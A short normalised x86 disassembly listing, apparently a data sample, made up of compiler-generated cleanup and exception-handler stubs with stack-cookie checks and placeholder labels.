mov eax r--data
jmp sub_40d876
sub_44ce50
mov ecx [ ebp - 0x10 ]
jmp sub_404e30
sub_44ce58
push 0x7e0
mov eax [ ebp - 0x14 ]
push eax
call sub_40c397
add esp 0x8
retn
sub_44ce6a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_40c3ae
mov eax r--data
jmp sub_40d876
sub_44ce90
push 0x7e0
mov eax [ ebp - 0x10 ]
push eax
call sub_40c397
add esp 0x8
retn
sub_44cea2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40c3ae
mov eax r--data
jmp sub_40d876
sub_44cec0
push 0x1
mov eax [ ebp + 0xc ]
push eax
call sub_40c397
add esp 0x8
retn
sub_44cecf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_40c3ae
mov eax r--data
jmp sub_40d876
sub_44ceea
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40c3ae
mov eax r--data
jmp sub_40d876
